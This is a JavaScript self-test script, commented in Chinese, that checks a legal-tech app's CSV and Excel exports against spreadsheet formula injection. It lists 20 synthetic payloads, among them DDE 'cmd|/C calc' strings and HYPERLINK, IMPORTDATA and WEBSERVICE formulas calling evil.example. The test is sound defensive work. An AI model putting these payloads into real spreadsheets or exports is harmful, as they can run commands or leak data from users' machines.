// 【施工单-10 单元一】表格导出公式注入防御·合成自测（CSV/XLSX 全导出面；全合成材料、零真模型、零外网、零端口）。
// 覆盖面（先盘点后动手，盘点清单见 docs/evidence/逆向吸收波二-20261101/单元一-表格导出公式注入防御.md）：
//   A. #32 尽调台账 CSV——内核 ledgerToCsv（盘上落盘 diligence-ledger.csv 与 HTTP 下载直出
//      /api/diligence/ledgers/{id}/csv 两路同源此 choke）×20 payload：CSV 文本读回首字符为 '；
//      文档来源（规则抽取入库）与人工编辑同 choke；纯数字金额不拦；干净值零改写。
//   B. SpreadsheetML Excel 面（@juscite/vizb ssCell 单点）——大事记 Excel 母表（composeChronicle
//      全守卫链）×payload：载荷恒落 ss:Type="String" 格、全表 ss:Formula 仅我方 ROW()-2、
//      载荷零入公式；对抗 17 列分析表（composeConfrontation）同断言＋全表零公式。
//   C. 公式通道封锁负例：字符串格携 ss:Formula＝ssCell fail-fast 具名拒（xlsx 侧「不经公式/
//      数值推断」的机制面）。xlsx(ooxml) 侧 openpyxl 读回 data_type=='s' 断言在
//      implementation/tests/test_tabular_export_formula_guard_wiring.py（桥 Python 侧 export.xlsx）。
// 运行：node --import tsx tools/bridge/tabular_export_synthetic.mjs（与 ci_gate.mjs 调用形一致）。
// oc28(:43127) 与常驻桥(:3030) 全程不接触（本探针零端口、进程内直驱）。
import { DatabaseSync } from "node:sqlite";
import { ledgerToCsv, extractLedgerRows } from "../../packages/juscite-legal/src/kernel/diligenceLedgerModel.ts";
import { csvFormulaGuard, isCsvFormulaLead } from "../../packages/juscite-legal/src/kernel/tabularExportGuard.ts";
import { parseCsvTable } from "../../packages/juscite-edisc/src/tableKernel.ts";
import { projectChronicleFactBase } from "../../packages/juscite-legal/src/panels/chronicleView.ts";
import { composeChronicle, parseExcelRows } from "../../packages/juscite-vizb/src/chronicle/index.ts";
import { composeConfrontation } from "../../packages/juscite-vizb/src/confrontation/index.ts";
import { ssCell, xmlEscape } from "../../packages/juscite-vizb/src/shared/xml.ts";
import { createDiligenceService, DILIGENCE_DDL, createDiligenceDao } from "./diligence_service.mjs";

// ── 合成负例 20（与 packages/juscite-legal/test/tabularExportGuard.test.ts 同族同序）──
const PAYLOADS = [
  "=cmd|'/C calc'!A0",
  "=CMD|' /C calc'!A0",
  "=2+5+cmd|'/C calc'!A0",
  "=HYPERLINK(\"http://evil.example/x\",\"点击\")",
  "=HYPERLINK(\"javascript:alert(1)\",\"x\")",
  "+1-1",
  "+cmd|'/C calc'!A0",
  "-2+3+cmd|'/C notepad'!A0",
  "@SUM(A1:A2)",
  "@cmd|'/C calc'!A0",
  "\t=cmd|'/C calc'!A0",
  "\r=cmd|'/C calc'!A0",
  "\n=1+1",
  " =cmd|'/C calc'!A0",
  "\t+HYPERLINK(\"http://evil.example\",\"x\")",
  "\t-2+2",
  "\r@SUM(1,2)",
  "=IMPORTDATA(\"http://evil.example/csv.csv\")",
  "=WEBSERVICE(\"http://evil.example/ping\")",
  "=@SUM(1+1)*cmd|'/C calc'!A0",
];

let pass = 0, fail = 0;
function assert(n, cond, label, detail = "") {
  if (cond) { pass += 1; console.log(`  #${n} OK  ${label}`); }
  else { fail += 1; console.log(`  #${n} FAIL ${label}${detail ? ` ｜ ${detail}` : ""}`); }
}
const cellsOf = (csv) => parseCsvTable(csv.replace(/^\uFEFF/, ""), "回读").flatMap((t) => t.rows.map((r) => r.cells));

function ledgerWith(values) {
  return {
    ledgerId: "dledg_synth", caseId: "case_synth", schemaName: "尽调合成模板",
    fields: [{ name: "备注", type: "text" }, { name: "金额", type: "text" }],
    rows: values.map((v, i) => ({
      rowNo: i + 1, docId: `doc_${i + 1}`, docTitle: `合成底稿${i + 1}.txt`,
      cells: { 备注: { value: v, origin: "rule", evidence: null }, 金额: { value: "100.00", origin: "rule", evidence: null } },
    })),
    status: "open", createdAt: "2026-11-01T00:00:00Z", updatedAt: "2026-11-01T00:00:00Z",
  };
}

console.log("[A] #32 尽调台账 CSV：内核 choke ×20 payload");
{
  const cells = cellsOf(ledgerToCsv(ledgerWith(PAYLOADS))).slice(1);
  assert("A1", cells.length === PAYLOADS.length && PAYLOADS.every((p, i) => cells[i][1].startsWith("'") && cells[i][1].slice(1) === p),
    "20 payload 过 ledgerToCsv 读回首字符均为 ' 且其余逐字保留",
    `rows=${cells.length}`);
  const amounts = cellsOf(ledgerToCsv(ledgerWith(["-1200.00", "+300", "-1,200.50"]))).slice(1);
  assert("A2", amounts.map((c) => c[1]).join("|") === "-1200.00|+300|-1,200.50",
    "纯数字金额（负数/千分位/加号）不拦");
  const clean = ledgerToCsv(ledgerWith(["正常备注"]));
  assert("A3", clean === "底稿文件,备注,金额\r\n合成底稿1.txt,正常备注,100.00\r\n",
    "回归：干净台账 CSV 与既有口径逐字节一致（防御零改写）");
}

console.log("[A2] 文档来源入库（规则抽取）→ 同一 choke");
{
  const docs = PAYLOADS.slice(0, 5).map((p, i) => ({
    docId: `doc_${i + 1}`, docTitle: `合成材料${i + 1}.txt`,
    blocks: [{ page: 1, seq: 0, bbox: null, text: `备注：${p}`, source: "chunk", ocrVersion: null }],
  }));
  const out = extractLedgerRows({ name: "尽调合成模板", fields: [{ name: "备注", type: "text" }] }, docs);
  const cells = cellsOf(ledgerToCsv({ ...ledgerWith([]), rows: out.rows })).slice(1);
  assert("A4", out.rows.length === 5 && PAYLOADS.slice(0, 5).every((p, i) => cells[i][1] === "'" + p),
    "文档行「备注：=payload」规则抽取入库→CSV 读回仍前置 '（文档来源面实证）",
    `rule=${out.stats.cellsRule}`);
}

console.log("[A3] HTTP 下载直出路由（进程内直驱真 httpHandler，零端口）");
{
  const db = new DatabaseSync(":memory:");
  db.exec(DILIGENCE_DDL);
  const dao = createDiligenceDao(db);
  const svc = createDiligenceService({
    dao, caseExists: (id) => id === "case_synth", workspaceKey: "ws-synth", authFilePath: null,
    taskShell: null, llmExtract: null, log: () => {},
  });
  const ledger = ledgerWith(PAYLOADS);
  dao.putLedger({
    workspace_key: "ws-synth", ledger_id: ledger.ledgerId, case_id: ledger.caseId, schema_id: "",
    schema_name: ledger.schemaName, fields_json: JSON.stringify(ledger.fields), rows_json: JSON.stringify(ledger.rows),
    stats_json: "{}", status: "open", created_at: ledger.createdAt, updated_at: ledger.updatedAt,
  });
  let body = null, ctype = null, disposition = null;
  const res = { headersSent: false, writeHead(code, headers) { this.code = code; ctype = headers["content-type"]; disposition = headers["content-disposition"]; }, end(b) { body = b; } };
  const req = { method: "GET", headers: {} };
  const url = new URL("http://local/api/diligence/ledgers/dledg_synth/csv");
  const handled = await svc.httpHandler(req, res, url);
  const cells = cellsOf(String(body ?? "")).slice(1);
  assert("A5", handled && res.code === 200 && ctype === "text/csv; charset=utf-8" && String(disposition ?? "").includes("attachment"),
    "GET /api/diligence/ledgers/{id}/csv 直出命中（text/csv attachment）",
    `code=${res.code} ctype=${ctype}`);
  assert("A6", body.startsWith("\uFEFF") && PAYLOADS.every((p, i) => cells[i] && cells[i][1].startsWith("'") && cells[i][1].slice(1) === p),
    "下载直出体=BOM+防御后 CSV：20 payload 读回首字符均为 '（勿漏下载直出路径）");
}

console.log("[B] SpreadsheetML Excel 面（@juscite/vizb ssCell 单点）");
{
  // B1 大事记 Excel 母表：payload 作引文（照录列=文档来源），经面板投影→桥 composeChronicle 全守卫链。
  // 前置约束（如实披露）：空白先行形 payload（\t/\r/\n/空格 7 个）被该产物自有「照录逐字」交付自检
  // 拒绝（R-content，既有契约不破）——它们在 B1b 用 ssCell 单点断言 + C1/C3 单元面覆盖。
  const wsLead = (p) => /^[ \t\r\n]/.test(p);
  const payloads = PAYLOADS.filter((p) => !wsLead(p));
  const events = payloads.map((p, i) => ({
    eventId: `s${i + 1}`, eventType: "开庭", date: "2026-04-10",
    sourceRefs: [{ filename: `材料${i + 1}.txt`, locator: "p1¶1", quote: p }], payload: { subjects: ["王五"] },
  }));
  const docTexts = payloads.map((p, i) => ({ filename: `材料${i + 1}.txt`, text: `王五于2026年4月10日记录：${p}（合成）`, truncated: false }));
  const proj = projectChronicleFactBase(events, docTexts, "合成公式注入防御案");
  const composed = composeChronicle(proj.factBase);
  const xml = composed.artifacts?.excelXml ?? "";
  const formulas = [...xml.matchAll(/ss:Formula="([^"]*)"/g)].map((m) => m[1]);
  assert("B1", composed.ok, `大事记母表 composeChronicle ok（${payloads.length} 个非空白先行 payload 引文全过守卫链不降级）`, composed.refusal ?? "");
  assert("B2", payloads.every((p) => xml.includes(`<Data ss:Type="String" xml:space="preserve">${xmlEscape(p)}</Data>`)),
    "非空白先行 payload 全部落 ss:Type=\"String\" 格（强制 string，不经公式/数值推断）");
  assert("B3", formulas.length === payloads.length && formulas.every((f) => f === "ROW()-2"),
    `全表 ss:Formula 仅我方序号列 ROW()-2（恰 ${payloads.length} 处，载荷零入公式）`, `formulas=${JSON.stringify(formulas.slice(0, 3))}…`);
  const parsed = parseExcelRows(xml);
  assert("B4", parsed.formulas.length === payloads.length && parsed.formulas.every((f) => f.formula === "ROW()-2")
    && payloads.every((p) => parsed.cells.some((row) => row.includes(p))),
    "回归：parseExcelRows 官方回读——载荷原文在格、公式清单仅 ROW()-2（防御不触碰交付值/回读链）");
  const tabLead = "\t=cmd|'/C calc'!A0";
  const wsEvents = [{ eventId: "w1", eventType: "开庭", date: "2026-04-10",
    sourceRefs: [{ filename: "材料W.txt", locator: "p1¶1", quote: tabLead }], payload: { subjects: ["王五"] } }];
  const wsProj = projectChronicleFactBase(wsEvents, [{ filename: "材料W.txt", text: `王五于2026年4月10日记录：${tabLead}（合成）`, truncated: false }], "合成公式注入防御案");
  const wsComposed = composeChronicle(wsProj.factBase);
  assert("B1b", wsComposed.ok === false,
    "空白先行 payload 被该产物自有交付自检拒绝（逐字照录契约=既有深度防御，本单零改动不破）", wsComposed.refusal ?? "");

  // ssCell 单点（SpreadsheetML 全部产物的大一统 choke）：全部 20 payload（含空白先行形）恒 String 格
  assert("B4b", PAYLOADS.every((p) => ssCell(p).startsWith('<Cell><Data ss:Type="String" xml:space="preserve">')),
    "ssCell 单点：20 payload（含 \\t/\\r/空格先行）全部渲染为 ss:Type=\"String\" 格（不经公式/数值推断）");

  // B2 对抗 17 列分析表：payload 入待补清单（自由文本列）
  const sem = confrontationSemWith(PAYLOADS.slice(0, 6));
  const conf = composeConfrontation(sem);
  const cxml = conf.artifacts?.analysisTableXml ?? "";
  const cformulas = [...cxml.matchAll(/ss:Formula="([^"]*)"/g)].map((m) => m[1]);
  assert("B5", conf.ok, "对抗分析表 composeConfrontation ok", conf.refusal ?? "");
  assert("B6", PAYLOADS.slice(0, 6).every((p) => cxml.includes(`<Data ss:Type="String" xml:space="preserve">${xmlEscape(p)}</Data>`)),
    "对抗表 payload 恒落 String 格");
  assert("B7", cformulas.length === 0, "对抗表全表零 ss:Formula（该产物本就无公式通道）");
}

console.log("[C] 公式通道封锁负例（ssCell 单点 fail-fast）");
{
  let threw = null;
  try { ssCell("=cmd|'/C calc'!A0", { formula: "=cmd|'/C calc'!A0" }); } catch (e) { threw = e; }
  assert("C1", threw && String(threw.message).includes("公式通道仅数值格开放"),
    "字符串格携 ss:Formula＝具名 fail-fast 拒（不可信文本不可进可执行通道）", threw ? "" : "未抛");
  assert("C2", ssCell(7, { type: "Number", formula: "ROW()-2" }).includes('ss:Formula="ROW()-2"'),
    "我方自产数值格公式（ROW()-2）不受影响");
  assert("C3", isCsvFormulaLead("\t=1") && csvFormulaGuard("\t=1") === "'\t=1",
    "sanitizer 共享单点：内核与探针同源 import（禁散写自证）");
}

console.log(fail === 0 ? "TABULAR_EXPORT_SYNTH_PASS" : "TABULAR_EXPORT_SYNTH_FAIL");
process.exit(fail === 0 ? 0 : 1);

function confrontationSemWith(toCompletePayloads) {
  return {
    schema: "juscite.vizb.confrontation@1",
    caseTitle: "戊公司诉丙公司买卖合同纠纷（合成）",
    internalOnly: true, maturity: "L2",
    procedure: { jurisdiction: "合同履行地法院管辖（合成）", standing: "双方主体适格（合成）", repeatedSuit: "未发现重复起诉（合成）" },
    sources: [
      { name: "起诉状七.txt", text: "请求判令丙公司支付货款三十万元及逾期利息。双方于2026年2月签订买卖合同，戊公司已交付全部货物。" },
      { name: "答辩状七.txt", text: "丙公司辩称货物存在质量问题，并已支付部分货款二十九万元，不应再支付。" },
    ],
    claims: [
      { no: "诉1", type: "payment", summary: { text: "请求判令丙公司支付货款三十万元及逾期利息。", src: "起诉状七.txt", srcKind: "起诉状" },
        claimedCents: 30000000, items: [{ label: "货款本金", cents: 30000000, basis: "合同第七条（合成）" }], adjustments: [],
        required: { counterpart: "丙公司", subjectMatter: "货物买卖", amount: "三十万元" } },
    ],
    defenses: [
      { no: "抗1", category: "denial", text: { text: "丙公司辩称货物存在质量问题，并已支付部分货款二十九万元，不应再支付。", src: "答辩状七.txt", srcKind: "答辩状" },
        threeQuestions: ["针对诉1给付货款要件", "主张货物存在质量问题", "暂无质检报告（待补，合成）"], burden: "claimant" },
    ],
    elements: [
      { no: "要件1", issue: "合同关系成立",
        claim: { text: "双方于2026年2月签订买卖合同，戊公司已交付全部货物。", src: "起诉状七.txt", srcKind: "起诉状" },
        response: { text: "丙公司辩称货物存在质量问题，并已支付部分货款二十九万元，不应再支付。", src: "答辩状七.txt", srcKind: "答辩状" },
        counter: { absent: true, reason: "无书面记载" }, second: { absent: true, reason: "未获取" },
        burden: "claimant", lawConfidence: "high", evidenceConfidence: "mid", source: "起诉状七",
        disputed: true, evidenceStandardMet: true },
      { no: "要件2", issue: "货款支付条件成就",
        claim: { text: "戊公司已交付全部货物。", src: "起诉状七.txt", srcKind: "起诉状" },
        response: null, counter: null, second: null,
        burden: "claimant", lawConfidence: "mid", evidenceConfidence: "low", source: "送货单（合成）",
        disputed: false, evidenceStandardMet: true },
    ],
    toComplete: toCompletePayloads,
  };
}
